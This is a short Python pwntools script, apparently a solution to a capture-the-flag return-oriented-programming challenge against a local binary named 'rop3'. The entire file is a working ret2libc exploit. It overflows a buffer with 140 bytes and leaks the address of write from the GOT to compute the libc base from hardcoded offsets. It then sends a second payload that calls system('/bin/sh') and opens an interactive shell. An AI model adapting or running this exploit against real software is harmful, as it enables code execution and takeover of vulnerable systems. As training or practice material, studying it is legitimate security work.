from pwn import *
context.log_level = 'debug'
p = process('./rop3')
file = ELF('./rop3')
ExAddr = 0x08048474
leak = p32(file.plt['write'])+p32(ExAddr)+p32(1)+p32(file.got['write'])+p32(4)
junk = 'a'*140
p.send(junk+leak)
write_offset = 0xE8DB0
libc_basic = u32(p.recv())-write_offset
print hex(libc_basic)
system = 0x0003E8F0+libc_basic
binsh = 0x0017FAAA+libc_basic
sh = 0x0017FAA7+libc_basic
pwn = junk+p32(system)+'junk'+p32(binsh)
p.send(pwn)
p.interactive()
